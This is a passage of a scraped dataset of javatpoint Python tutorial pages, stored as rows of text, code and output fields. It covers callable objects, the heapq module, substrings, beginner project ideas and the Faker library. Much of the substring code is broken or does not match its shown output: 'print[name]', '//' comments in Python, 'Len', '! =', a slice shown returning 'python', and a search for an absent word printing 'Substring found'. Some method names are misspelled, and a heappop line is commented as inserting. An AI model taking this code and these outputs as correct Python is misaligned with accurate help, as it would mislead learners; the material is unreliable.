to allow passing variable arguments and **kwargs to allow passing named arguments to the __call__() method.', 'Now, let us consider another example where we will have used the callable() function to check whether the object is callable or not and then called the object as a function.']","['In the above example, we have defined a class Employee that takes a variable n = 0. We have then defined a function and instantiated the class. At last, we have checked whether the class and its object are callable or not using the callable() function.', 'In the above example, we have defined the Person class and the variables person_id = 0 and person_name = "" "". We have then defined the initializing function along with the callable function. At last, we have instantiated the class, printed the object, and checked whether the object is callable or not. And as a result, the person object appears to be callable.', 'In the above example, we have defined an if-statement where if the object m is callable, then the object is called as a function without arguments, with only arguments, with __call__() function, with the arguments of different types and with arguments and keyword arguments. As a result, the required objects have been called successfully.']","['# creating a class', 'class Employee:', 'n = 0', '# defining a function', 'def __init__(self, emp_id):', 'self.i = emp_id', '# instantiating the class', 'x = Employee(15)', '# checking if the class and object are callable or not', ""print('Employee Class is callable = ', callable(Employee))"", ""print('Employee object is callable = ',"", '# creating Person Class', 'class Person:', 'person_id = 0', 'person_name = """"', '# defining an initializing function', 'def __init__(self, personid, personname):', 'self.person_id = personid', 'self.person_name = personname', '# defining a callable function', 'def __call__(self, *args, **kwargs):', ""print('Printing Arguments')"", 'print(*args)', ""print('Printing Keyword Arguments')"", 'for key, value in kwargs.items():', 'print(""%s == %s"" % (key, value))', '# instantiating the class', ""m = Person(15, 'George')"", '# printing the object', 'print(m)', '# checking if the object is callable or not', 'print(""The Person object is callable: "", callable', 'if callable(m):', 'm()', 'm(15, 30)', 'm.__call__(15, 30)', ""m(15, 30, {'a': 4, 'b': 8})"", ""m(15, 'B', personname = 'George', personid = 50)""]","['Employee Class is callable =  True', 'Employee object is callable =  False', '<__main__.Person object at 0x000002706DF41FD0>', 'The Person object is callable:  True', 'Printing Arguments', 'Printing Keyword Arguments', 'Printing Arguments', '15 30', 'Printing Keyword Arguments', 'Printing Arguments', '15 30', 'Printing Keyword Arguments', 'Printing Arguments', ""15 30 {'a': 4, 'b': 8}"", 'Printing Keyword Arguments', 'Printing Arguments', '15 B', 'Printing Keyword Arguments', 'personname == George', 'personid == 50']",[],[]
196,['Python heapq module'],['Priority Queues and Heaps are quite unpopular but astonishingly beneficial data structures. These data structures provide pretty easy to use and highly effective solutions for the problems like finding the best element in a dataset and a lot more. The heapq module of Python is the segment of its Standard Library. This module implements all the low-level heap operations and some common high-level utilization for heaps.'],"['https://www.javatpoint.com/python-substring', 'https://www.javatpoint.com/python__call__method', 'https://www.javatpoint.com/https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-substring', 'https://www.javatpoint.com/python__call__method', 'https://www.javatpoint.com/python-substring']",[],[],[],"['An Introduction to Heaps and Priority Queues', 'Understanding Heaps', 'Understanding the heapq module in Python', 'Creating a Heap', 'Insertion of data elements into a heap', 'Removal of a data element from the heap', 'Replacing a data element in a heap']",[],"['Let us begin with understanding heaps.', 'Let us understand some Operations on the heap:', 'Now, let us understand the working of these functions of the heapq module in the following sections.', 'Explanation:', 'Now let us try inserting data elements into a heap.', 'Explanation:', 'Now, let us try removing the element from the heap.', 'Explanation:', 'Now, let us understand how to replace an element in a heap', 'Let us consider an example to understand the concept of replacing an element in a heap.', 'Explanation:']","['Heaps are the concrete data structures, while priority queues are the abstract data structures. A Concrete data structure expresses the implementation, whereas an abstract data structure governs the interface.', 'We generally use heaps in order to implement priority queues. They are the most famous concrete data structure used to implement abstract data structures like priority queues.', 'We can remove the data element at the first index with the help of the heappop() function. Let us consider the following example to understand how the process of removing the data element is carried away.', 'In the above example, we have again imported the heapq module, defined a list, and convert it to a heap. We have then used the heappop() function to remove the first index element from the list. As a result, the element is removed successfully.', 'In order to replace a data element, we can use the heapreplace() function. This function always removes the smallest data element presenting in a heap and adds the new incoming element at some place not defined in the order.']","['The Data structure like a priority queue plays an essential role as a powerful tool in solving problems such as writing an e-mail scheduler, merging log files, or finding the shortest path on a map. As we know, Programming is full of problem optimization where the goal is to find the best element and Priority queues, and the functions in the Python heapq module can often serve as a solution for that.', 'In the following tutorial, we will learn what heaps and priority queues are and how they associate with each other. We will also discover what type of problems can be resolved using a heap and how we can use the Python heapq module in order to solve these problems.', 'Concrete data structures also indicate performance guarantees. Performance guarantees ensure the relationship between the structure size and the time taken by the operations. These performance guarantees allow us to predict the time taken by the program as the input size change.', ""As we know, the data structure 'heap' is generally utilized to represent a priority queue. We can perform this implementation using the heapq module in Python standard library. The property of heap data structure in Python is to pop the smallest heap element every time (min-heap). Whenever the data elements are popped or pushed, the heap structure is maintained. The heap[0] element also delivers the smallest data element every time."", 'We can create a heap by utilizing the data elements list with the help of the heapify() function. Let us consider an example to understand the working of the heapify() function, where a list of data elements is provided, and the function rearranges the data elements. It brings the smallest element to the first position.', 'In the above example, we have imported the heapq module and defined a list of data elements. We have then used the heapify() function to rearrange the data elements bring the smallest data element to the first position. At last, we have printed the list for the users. As a result, the data elements in the list are rearranged, and the smallest element has been brought to the first position.', 'We can insert a data element into a heap using the heappush() function. The element inserted into the list always adds to the last index. However, we can use the heapify() function again in order to bring the newly inserted data element to the first index only if it appears to be the smallest in the value. Let us consider an example demonstrating the working of the heappush() function.', 'In the above example, we have again imported the heapq module and defined a list. We have then converted the list to a heap and printed the list to the user. We have then used the heappush() function to add a new element to the list and printed the final list for the user. As a result, the new data element is inserted at the last index of the list.', 'In the above example, we have again imported the heapq module, defined a list, and created the heap. We have then used the heapreplace() function to replace a data element in the list with the one we defined in the parameter. As a result, the smallest element is replaced successfully.']","['# importing the heapq module', 'import heapq', '# defining a list', 'mylist = [14, 23, 4, 43, 34, 9, 18, 1, 25, 8]', '# Using the heapify() function to rearrange the data elements', 'heapq.heapify(mylist)', '# printing the list', 'print(mylist)', '# importing the heapq module', 'import heapq', '# defining a list', 'mylist = [14, 23, 4, 43, 34, 9, 18, 1, 25, 8]', '# Using the heapify() function to rearrange the data elements', 'heapq.heapify(mylist)', '# printing the list', 'print(mylist)', '# inserting element to the list', 'heapq.heappush(mylist, 20)', '# printing the final list', 'print(mylist)', '# importing the heapq module', 'import heapq', '# defining a list', 'mylist = [14, 23, 4, 43, 34, 9, 18, 1, 25, 8]', '# Using the heapify() function to rearrange the data elements', 'heapq.heapify(mylist)', '# printing the list', 'print(mylist)', '# inserting element to the list', 'heapq.heappop(mylist)', '# printing the final list', 'print(mylist)', '# importing the heapq module', 'import heapq', '# defining a list', 'mylist = [14, 23, 4, 43, 34, 9, 18, 1, 25, 8]', '# Using the heapify() function to rearrange the data elements', 'heapq.heapify(mylist)', '# printing the list', 'print(mylist)', '# replacing element in the list', 'heapq.heapreplace(mylist, 99)', '# printing the final list', 'print(mylist)']","['[1, 8, 4, 23, 14, 9, 18, 43, 25, 34]', '[1, 8, 4, 23, 14, 9, 18, 43, 25, 34]', '[1, 8, 4, 23, 14, 9, 18, 43, 25, 34, 20]', '[1, 8, 4, 23, 14, 9, 18, 43, 25, 34]', '[4, 8, 9, 23, 14, 34, 18, 43, 25]', '[1, 8, 4, 23, 14, 9, 18, 43, 25, 34]', '[4, 8, 9, 23, 14, 99, 18, 43, 25, 34]']","['S. No.|||Operation or Function|||Description&&&1|||heapify(iterable)|||The heapify() function is utilized for converting the iterable into a heap data structure.&&&2|||heappush(heap, element)|||The heappush() function is utilized for inserting the data element specified in its parameters into a heap. The order can be adjusted to maintain the heap structure.&&&3|||heappop(heap)|||The heappop() function is utilized for removing and returning the smallest data element from the heap. The order can also be adjusted to maintain the heap structure.&&&4|||heappushpop(heap, element)|||The heappushpop() function is used to combine the working of both push and pop operations in a single statement that results in the increased efficiency. Once the operation is complete, the Heap order is maintained.&&&5|||heapreplace(heap, element)|||The heapreplace() function is used to insert and pop data elements in a single statement; however, it differs from the function stated above. In this function, the data element is popped at first, and then the data element is pushed. Thus, the value of an element more prominent than the value of the pushed element can be returned. The heapreplace() function is used to genuinely return the smallest value in a heap regardless of the element pushed instead of the heappushpop() function.&&&6|||nlargest(x, iterable, essential = fun)|||The nlargest() function is utilized for returning the most prominent elements x from the iterable determined that also satisfies the key if included.&&&7|||nsmallest(x, iterable, key = fun)|||The nsmallest() function is utilized for returning the minor elements x from the iterable determined that also satisfies the key if included.']",[]
197,['Python Substring'],"['""A string is a multiple code character/s series. The string includes a number or collection of characters that may include alphanumeric and special characters, respectively.""']","['https://www.javatpoint.com/project-ideas-for-python-beginners', 'https://www.javatpoint.com/python-heapq-module', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/project-ideas-for-python-beginners', 'https://www.javatpoint.com/python-heapq-module', 'https://www.javatpoint.com/project-ideas-for-python-beginners']","['https://static.javatpoint.com/python/images/python-substring.png', 'https://static.javatpoint.com/python/images/python-substring2.png', 'https://static.javatpoint.com/python/images/python-substring3.png', 'https://static.javatpoint.com/python/images/python-substring4.png', 'https://static.javatpoint.com/python/images/python-substring5.png', 'https://static.javatpoint.com/python/images/python-substring6.png', 'https://static.javatpoint.com/python/images/python-substring7.png', 'https://static.javatpoint.com/python/images/python-substring8.png', 'https://static.javatpoint.com/python/images/python-substring9.png', 'https://static.javatpoint.com/python/images/python-substring10.png', 'https://static.javatpoint.com/python/images/python-substring11.png', 'https://static.javatpoint.com/python/images/python-substring12.png']",[],"['String definition', 'Pre-defined String Methods', 'What is a Substring', 'Working of negative index']",[],[],"['For Example-', 'Here, we are going to discuss some methods that are used to manipulate the strings in python. They are tabulated below-', '""A substring is a sequential character segment within a string in proper language analysis and computer science.""', 'For instance, ""Itwastimes"" is a ""It was the better of times"" series, but not a substring.', 'In this document, we will explain the python substring and how it functions in the simplest terms.', 'The syntax of string creation in python is given below-', 'Here, the index starts from 0.', 'After the successful execution of the code, we got the below-mentioned screen.', 'We can use the method find() or in operator to evaluate whether the substring is available in the sequence or not.', 'The syntax of checking substring that it will lie in the string or not is given below-', ""Here, the find() method returns the index of substring's position, if it is matched, otherwise it will return -1."", 'Example Code', 'We can identify the number of iterations of a substring in the array using the count () method.', 'The syntax of checking the occurrence of substring that it lies in the string is given below-', 'Example code', 'We got the following output, after the execution of the above code.', 'The syntax of finding all the indexes of substring is given below-', 'Example code', 'After the successful execution of the above program code, we got the following output.', 'This gets back a sliced string starting from position 5 of the array until the last of the python sequence.', 'The syntax for slicing of substring through start-index without end-index is given below-', 'Example code', 'After the execution of the above code, we got the below screen.', 'This returns a sliced string from the beginning to the end-index-1.', 'The syntax for slicing of substring via end-index without start-index is given below-', 'Example code', 'After the execution of the above code, we got the below screen.', 'It helps you to get the whole string as output.', 'The syntax for slicing of whole substring is shown below-', 'Example code', 'After the execution of the above code, we got the below screen.', 'This gets back a single character of substring from a string.', 'The syntax for slicing of a single character from the string is shown below-', 'Example code', 'After the successful execution of the above code, we got the following output.', 'It will help you to return the string in reverse order.', 'The syntax for slicing of a reverse substring of the string is shown below-', 'Example code', 'After the successful execution of the above program code, we got the below output.', 'The working functionality of a negative index is demonstrated in the below table-', 'Here, in the above table, we take a word Python to demonstrate the exactly working functionality of the negative index.', 'The syntax for slicing of a string with the help of negative index is shown below-', 'Example code', 'After the successful execution of the above program code, we got the below output.', 'It is used to slice or substring the string with the help of positive index.', 'The syntax for slicing of a string with the help of positive index is shown below-', 'Example code', 'After the successful execution of the above program code, we got the below output.', 'It returns the complete substrings of a string with the help of string slicing and list comprehension.', 'Example code', 'After the successful execution of the above program code, we got the below output.', 'It returns the complete substrings of a string with the help of string slicing and list comprehension.', 'Example code', 'After the successful execution of the above program code, we got the below output.']","['In other words, ""A portion of a string is a substring. The Python string specifies several techniques for constructing a substring, checking if it includes a substring, substring index, etc.""', 'For example, a substring of ""the better of"" is ""It was the better of times"". This is not to be mistaken with a substring, which is a substring sweeping generalization. ', 'We can construct a substring with the help of string slicing. We should use split() method to accomplish an array of substrings based on the mentioned delimiter.', 'Python language does not have any built-in function to get the array of all the sub-string index values. After all, using the find() method, we can simply achieve one.', ""It is used to slice or substring the string with the help of negative index. The sequence index begins from 0 to 5, and we'll utilize a negative index as well.""]","[""In Python language, strings are one of the most common styles. By literally insulating characters in quotations, we can build them. Single quotes are handled by Python similar as double quotes. It's as easy to build strings as to allocate a value to a variable.""]","['Variable1 = ""Hello Python""', 'Variable2 = ""Welcome to the world of Python""', ""S = 'Welcome to the python world'"", 'name = s[10:]                      // substring creation with the help of slice', 'print[name]', 'A1 = s.split()', 'Print(A1)\t\t\t// Array of substring with the help of split() method', "">>> s = 'Welcome to the python world'"", '>>> s[10:]', ""'python'"", '>>> s.split()', ""['Welcome', 'to', 'the', 'python', 'world']"", ""s = 'Welcome to the python world'"", ""if 'Name' in s:                                   // Checking substring with the help of in operator"", ""print('Substring found')"", ""if s.find('Name') != -1:                    //  Checking substring with the help of find()"", ""print('Substring found')"", "">>> s = 'Welcome to the python world'"", "">>> if 'name' in s:"", ""Print ('Substring found')"", 'Substring found', "">>> if s.find('name') ! = -1:"", ""Print ('Substring found')"", 'Substring found', ""s = ' Welcome to the python world '"", ""print('Substring count =', s.count('c'))"", ""s = 'Python is a best language'"", ""print('Substring count =', s.count('Py'))"", "">>> s = ' Welcome to the python world '"", "">>> print('Substring count =', s.count('c'))"", "">>> s = 'Python is a best language'"", "">>> print('Substring count =', s.count('Py'))"", 'def find_all_indexes (input_str, substring):', ""s = 'Python is the best programming language'"", ""print(find_all_indexes(s, 'Py'))"", '>>> def find_all_indexes(input_str, substring):', '?    L2 = []', '?    length = Len(input_str)', '?    index = 0', '?    while index < Length:', '?    i = input_str.find(substring, index)', '?    if i == -1:', '?    return L2', '?    L2.append(i)', '?    index = i + 1', '?  return L2', "">>> s = ' Python is the best programming language '"", "">>> print(find_all_indexes(s, 'Py'))"", 's = s[  startIndex  : ]', "">>> s = 'It is to demonstrate substring functionality in python.'"", '>>> s [5:]', 's = s[  :  endIndex   ]', "">>> s = 'Python is a powerful programming language'"", '>>> s [7:]', 's = s[  :   ]', "">>> s = 'Python is a robust programming language.'"", '>>> s [ : ]', 's = s[  index   ]', "">>> s = 'Python is a widely used language.'"", '>>> s [ 12 ]', 's = s[  : : negative value  ]', "">>> s = 'Python language supports the string concept.'"", '>>> s [ : : -1 ]', 's = s[ 0 : negative value  ]', "">>> s = 'PYTHON'"", '>>> s [ 0 : -4 ]', 's = s[ 0 : positive value  ]', "">>> s = 'PYTHON'"", '>>> s [ 0 : -2 ]', "">>> s = 'PYTHON'"", '>>> str = [s[ i : j] ]', 'for i in range (Len(s))', 'for j in range (i + 1, Len(s) + 1)', 'print (str)', "">>> s = 'PYTHON'"", '>>> str = [s[ i : j] ]', 'for i in range (Len(s))', 'for j in range (i + 1, Len(s) + 1)', 'print (str)']",[],"[""Sr. No.|||Method|||Description&&&1.|||Center() |||A space-padded string with the input string positioned at the complete width of the columns is returned.&&&2.|||Count()|||If beginning list start and stopping index stop are specified, it is used to count the number of times 'str' occurs in sequence or in a substring of string.&&&3.|||Capitalize()|||This method is used to capitalize the first letter of string.&&&4.|||endswith()|||Defines if a string or substring of a string finishes with a suffix (if beginning list beg and stopping index end are offered); returns true and if so wrong if not.&&&5.|||encode()|||This method returns the encrypted string representation of the string; if a fault appears, ValueError is raised by default until errors are specified by 'ignore' or 'replace.'&&&6.|||decode()|||This technique will allow you to use the codec authorized for encryption to decrypt a string. Advanced encoding for the standard string encoding.&&&7.|||expandtabs()|||It is used to extend string sections to multiple spaces; if sections are not given by default, 8 spaces per section is needed.&&&8.|||find()|||This method determines whether str takes place in a string or substring if the beginning and the ending index are returned if the index is figured and -1 otherwise.&&&9.|||index()|||index() method works similar as like find() method but if str is not identified, therefore, it poses an exception.&&&10.|||isalpha()|||If the sequence has at least 1 letter and all letters are alphabet or false, it returns true.&&&11.|||isalnum()|||This method returns true if the sequence includes at least a single letter and all letters are alphanumeric and false.&&&12.|||islower()|||This method is used to return true if the string contains only single letter and all cased letters lies in lower case; otherwise, it returns false.&&&13.|||isdigit()|||It is used to return true if any sequence has digits otherwise, false.&&&14.|||istitle()|||Istitle() method returns true if the sequence appropriately in 'titlecase' otherwise it returns false.&&&15.|||isnumeric()|||It is used to return valid if there are only numeric letters in a unicode sequence, otherwise, returns false.&&&16.|||isspace()|||If the string has only whitespace letters, this method returns true, otherwise it returns false.&&&17.|||isupper()|||If the string contain at least single cased letter and all cased letters are in capital form, the isupper() method becomes true, otherwise it becomes false.&&&18.|||len()|||The len() method helps you to find the size or length of the string.&&&19.|||join()|||This function consolidates (concatenates) item sequence depictions in series seq into a string with a string separator.&&&20.|||maketrans()|||This method will allow you to return a conversion chart for the convert operation to be used.&&&21.|||lower()|||This will help you to transform all of the string's upper-case characters into lowercase.&&&22.|||ljust()|||This will be used to allocate a space-padded sequence to a maximum of column widths with the initial string left-justified.&&&23.|||istrip()|||This method will help you to eliminate all of the trailing string whitespace.&&&24.|||replace()|||It is used to displace all existing manifestations in the string with new manifestations or, if maximum is given, maximum manifestations at most.&&&25.|||max()|||This method is used to return the maximum alphabetical letters from the sequence str.&&&26.|||min()|||This method is used to return the minimum alphabetical letters from the sequence str.&&&27.|||rjust()|||It will help you to return the space-padded sequence to a maximum of column widths with the initial string right-justified.&&&28.|||rfind()|||The working of rfind() method is similar like find() method but it searches in backward string.&&&29.|||rindex()|||The working of rindex() function is similar like index() function but it look for the backward string.&&&30.|||strip()|||This method is used to perform the functionality of rstrip() and lstrip() function.&&&31.|||startswith()|||It is used to decide whether a sequence or substring sequence begins with str (if beginning index beg and finishing index end are granted); returns true if so and false if not.&&&32.|||split()|||It is used to split sequence by substring str (storage if not supplied) and returns the substring array; if supplied, separated into a maximum number of substrings.&&&33.|||spilitlines()|||It will be used to separate the string to all NEWLINEs (or num) and returns a list of each row with the deleted NEWLINEs.&&&34.|||translate()|||It is used to convert strings as per the str (256 chars) in the conversion table, eliminating those in the del series.&&&35.|||swapcase()|||The swapcase() method is used to Reverse the condition for all sequence letters.&&&36.|||title()|||It is used to Return the string's description edition, i.e., all terms start in upper case and the remainder in lower case.&&&37.|||isdecimal()|||It is used to return true if there are only decimal letters in the unicode sequence and false, instead.&&&38.|||zfill()|||This method will help you to return the original left-padded sequence of zeros to a maximum of letters in width; zfill() preserves any specified signature for digits (less one zero).&&&39.|||upper()|||This will help you to transform all of the string's lower-case characters into uppercase.&&&40.|||rstrip()|||It is used to Eliminate all preceding sequence whitespace."", '|||P|||Y|||T|||H|||O|||N&&&0|||1|||2|||3|||4|||5&&&-5|||-4|||-3|||-2|||-1|||-0']",['|||Creation of a Substring||||||Checking if we found the substring||||||Checking of substring occurrence||||||All indexes finding in substring||||||Slicing with the help of start-index without end-index||||||Slicing with the help of end-index without start-index||||||Slicing with the complete string||||||Slicing a single character from a string||||||Reverse a string with the help of negative (-) step||||||Slicing of a string with the help of negative (-) index||||||Slicing of a string with the help of positive (+) index||||||Retrieving all substring with the help of list comprehension||||||Retrieving all substring with the help of itertools.combination() method|||']
198,['Project ideas for Python Beginners'],"['Creating projects are the best way to learn any technology or programming language. Python is the most popular and demanding language in the current scenario. We can challenge ourselves to write the code for a particular project. Learning a new programming language is slightly hard. To get started with Python, we have the best Python tutorial.']","['https://www.javatpoint.com/python-faker', 'https://www.javatpoint.com/python-substring', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/http://www.javatpoint/python-features', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-convert-text-to-speech-in-python', 'https://www.javatpoint.com/python-faker', 'https://www.javatpoint.com/python-substring', 'https://www.javatpoint.com/python-faker']",[],[],['Beginners Level Python Project Ideas'],"['Why should learn Python?', '1. Rock Paper Scissor', '2. Website Blocker', '3. Build a Twitter Bot', '4. MadLibs Generator', '5. Hangman', '6. Number Guessing', '7. Dice Rolling Simulator', '8. Binary Search Algorithm', '9. YouTube Video Downloader', '10. Text-based Adventure Game', '11. Contact Book', '12. Password Generator', '13. Convert Text to speech', '14. Message Encode Decode in Python']",[],"['After finishing the Python theoretical lesson, it is time to test the knowledge with the Python projects.', 'Before starting a discussion over the projects, we need to understand why we should learn Python.', 'This program requires making the first move from the user, and then the computer makes the moves and validates the results.', 'To create this program, we need a function to compare the guessed number with the inputted number.']","['As per the current report, Python has become the second most popular programming language, and it has been growing steadily. Proficient Python developer can land on a lucrative and high paying job.', 'As the name suggests, we will create rolling dice. It is one of the most interesting and popular Python projects, and it will generate a random number between 1 to 6 as the standard dice.', 'We ask the user if they would like to roll the dice again. We will create a function that will generate a number randomly for them multiple times. This project will help to build a strong foundation for Python fundaments.', 'The binary search algorithm is the key concept of data structure. It will help to sharp the programming skill. In this program, we will create a list of 1 to 100, with every following number having a difference of 2 between them.', 'Let us understand the logic of the binary search algorithm; when the user enters the number, the program will check in the defined list whether the list contains the input number or not.', 'It is the basic game and completely text-based. In this game, the user can move about through different within a single setting. The user input decides where we need to move. It will describe each room. It is one of the interesting games to create.', 'Direction to move is important here. We need to create walls and set the direction in which the user can move through the rooms. We also need to set movement restrictions and include the tracker that tracks how far the user has walked.', 'It is an important concept for everyone. We can create an app that generates the password for all types of users. All types of users can use these generated passwords to secure their accounts.', 'It is beneficial to hide beneficial information to hide sensitive information. The main objective of this project is to encode and decode the message using a common key. To create the project, we will use the Tkinter and base64 library.']","['Topmost companies such as Google, Instagram, Spotify, Dropbox, Reddit, Instacart, etc., rely on Python. Or we can say that adding Python to the resume will make a more attractive candidate to prospective employees. We define below a few important features of Python.', ""We have written the complete tutorial of Python, its popular frameworks and libraries. We have defined a basic introduction to advanced topics of Python. Check out our great resource and learn more about the Python Features. Let's discuss the project ideas for beginners."", ""In the start, we suggest don't choose the projects that require expert skills in Python. Choosing a difficult project can lead to a stressful experience. Once we get a good command over the simple project, we can easily shift to build complex projects. We have listed below the project ideas for beginner level Python developer."", 'This is a mini-game which we can play alone. It is the most beloved game of all time and a simple Python project to test our skill. This will give the basic understanding of while loops and if statements. This program requires the following functions.', 'While surfing the internet, many unwanted sites pop up. These pop-ups distract us. This project will help in such cases as it can be built up to block certain websites from opening. It is helpful for those who get easily abstracted to switch social media while doing necessary work. In this program, we need to import the time date module.', ""Twitter is one of the most popular social media networks. It is the most prominent platform to engage with the audience. We can also handle our account offline by using this project. Twitter presence involves various tasks such as keeping the account active with new tweets and retweets, following interest accounts and replying to followers. We can also these tasks manually; we don't need to visit the Twitter website or app. A Twitter Bot automates all or part of Twitter activity."", 'MadLibs Generator is a good start for a beginner Python developer. It includes concepts like string, variables, and concatenation. In this project, we manipulate user-inputted data as Mad libs refer to a series of inputs that a user enters. The user can enter anything such as an adjective, a pronoun, or a verb. After taking all the inputs, the application arranges it to build a story template.', 'We can consider a hangman game is the best game for beginners. We assume that all of us have played Hangman at one point in time in our life. In other words, Hangman is a ""guessing a word"" game. We don\'t need to use the external module, Python loops, and random module to create this game.', 'Number Guessing is a simple but exciting game. We can consider it as a mini-game. We create a program in which the computer chooses the number randomly between 1 to 100, or any number. The user guesses the number, and if he guesses wrong, then the computer gives a clue. Every time user guesses the wrong number, he gets another clue, and his score get reduces. The clue can be anything such as divisible of guessing number, multiples, greater, or smaller, or combination of all.', 'It will happen by doing the two halves of the list. It will check in the first half of the list; if it finds the given number, it will eliminate the other half of the list and vice-versa. The search will continue until the sublist becomes zero; that means the number is not present in the list.', ""YouTube is the most popular video streaming platform in the world. YouTube video downloader is one of the best ideas to start experimenting with hand-o experience. Sometimes, we want to download video permanently, but YouTube doesn't provide that option. We can create an app with a simple UI and download a video in a different format. This project may look difficult to accomplish, but it is easy when we start working on it."", 'Contact Book is also an excellent Python project for beginners. We need to save the contact details, including name, number, address, and even email address. This project is based on the command-line where we design a contact book that the user can save and find all contact details in one place. Here we all also add some functionality such as update contact information, delete contacts, and list saved contacts. We can use the SQLite database to save contacts.', 'We can convert Text into audio speech using the Python and Google APIs. It takes the Text as an input on digital devices and converts them into audio or speech with the button click of finger touch. Google provides the gTTS API, which has many built-in functions to save the text file as an mp3. To get the complete information, visit our how to convert Text to speech in Python (https://www.javatpoint.com/how-to-convert-text-to-speech-in-python).']",[],[],[],"['|||Easy to use|||Ease to learn|||Open Source (Freely available)|||Interpreted Language|||Extensive Libraries and Frameworks|||Rich Data Structure|||Portable Language|||Platform Independent|||Expressive Language|||Integrated Language|||Use in Data Science, Web Development, GUI Applications.||||||A random function|||Function for valid move|||Function for display result|||Function for keeping the score|||']"
199,['Python Faker'],"['Python provides an open-source library, also known as Faker that helps the user build their Dataset. We can generate random data using random attributes such as Name, Age, Location, and many more. The Faker library supports all central locations and languages beneficial to generate data relied on the locality.']","['https://www.javatpoint.com/fizz-buzz-program-in-python', 'https://www.javatpoint.com/project-ideas-for-python-beginners', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/fizz-buzz-program-in-python', 'https://www.javatpoint.com/project-ideas-for-python-beginners', 'https://www.javatpoint.com/fizz-buzz-program-in-python']",[],[],['Creating a Fake dataset using the faker library'],"['An Introduction to Faker', 'Implementation of Faker Library']",[],"['We can also use the generated datasets for the purpose of tuning the model of machine learning, validating the model and testing the model.', 'In the following tutorial, we will understand Faker and its functions and create our very own Dataset.', 'Let us begin with the implementation of the Faker library.', 'Importing necessary libraries', 'Using various functions', 'Some of the functions, we are going to use are listed below:', 'Let us consider an example demonstrating the working of these functions:', 'Explanation:', 'Explanation:', 'We can also generate our own texts or sentences using the functions like text and sentences.', 'Let us consider the following example to understand how these functions work.', 'Explanation:', 'Explanation:', 'Let us consider the following example to understand the behavior of this function.', 'Explanation:', 'Now, let us create a fake dataset with the help of the faker library.', 'Explanation:']","['Before we start working on the faker, it is necessary for us to install the library. We can do it by using the pip installer in the command prompt or terminal as shown below:', 'In order to discover various functions of the faker library, we must import the faker library. We are also importing the pandas library since we will perform few operations on the Dataset.', 'Once we are done importing the required library, let us try using various functions available in the Faker library. In order to perform such activity, we have to initiate the Faker function with the help of a variable as shown below:', 'However, we can also define a word library that stores a list of words that allows us to generate new fake sentences using those specified words. Let us consider the following example for generating fake sentences.', 'In the above example, we have again imported the required libraries and defined the variable. We have then used the profile function to generate the fake profile of a person and printed it for the users.']","['We can utilize this Faker data in order to tune models of machine learning, stress test a model, and many more. We can generate data depending on our requirements. We can also use Faker data for training and learning purposes, such as we can perform various operations on various types of data types.', 'In the above example, we have imported the required libraries and defined a variable for the Faker() module. We have then used some functions like name, date_of_birth, address, country, and email to generate some fake datasets. This generated dataset is so random that we will get a different dataset as an output every time we execute the code.', 'We can also generate information as per different localities and regions in different languages. All we have to do is to mention the language we want. Let us consider the following example where we have generated some data in the languages like Hindi, French, and Japanese.', ""In the above example, we have again defined the required libraries and defined a variable for the Faker() module where we have provided some languages as the parameters. We have then used the 'for' statement to print the different generated names for the specified number of times. As a result, the program has generated ten different names of different languages for the users."", 'In the above example, we have again imported the required modules and defined a variable for the Faker() module. We have then used the text and sentence functions to create our own sentences and printed them for the users. As a result, we have created our own sentences successfully.', 'In the above example, we have again imported the required libraries and defined the Faker() module variable. We have defined a list of words and used the sentence() function to create a sentence using the word library we created. As a result, the fake sentence has been generated using the words in the list.', 'Moreover, the Faker() module also provides a function to generate the complete profiles for different non-existing persons rather than generating names and addresses separately. This function is known as the profile function, and it generates a fake profile of a person.', 'Since we have discovered most of the functions and have already worked on the profile function in the previous section, let us try generating a dataset containing the fake profiles of 20 unique people. In order to store these profiles into a data frame, we will be using the pandas library too.', 'In the above example, we have again imported the required libraries and defined a variable. We have then defined the data that contains the profiles of 20 people. At last, we have converted this data into data frames and printed it for the users. As a result, the generated dataset stores various attributes such as job, company, locations, email, and a lot more. We can utilize this dataset as per our requirements.']","['$ pip install faker', 'from faker import Faker', 'import pandas as pd', 'sample = Faker()', 'sample.name()', 'sample.date_of_birth()', 'sample.address()', 'sample.country()', 'sample.email()', '# importing the required libraries', 'from faker import Faker', 'import pandas as pd', '# defining the variable for Faker() module', 'sample = Faker()', '# using some functions', 'print(""Your Name: "", sample.name())', 'print(""Your Date of Birth: "", sample.date_of_birth())', 'print(""Your Address: "", sample.address())', 'print(""Your Country: "", sample.country())', 'print(""Your E-mail Address: "", sample.email())', '# importing the required libraries', 'from faker import Faker', 'import pandas as pd', '# defining the variable for Faker() module', ""sample = Faker(['hi_IN', 'fr', 'jp_JP'])"", 'for n in range(10):', 'print(sample.name())', '# importing the required libraries', 'from faker import Faker', 'import pandas as pd', '# defining the variable for Faker() module', 'sample = Faker()', '# printing the text', 'print(""Text: "", sample.text())', '# printing the sentence', 'print(""Sentence: "", sample.sentence())', '# importing the required libraries', 'from faker import Faker', 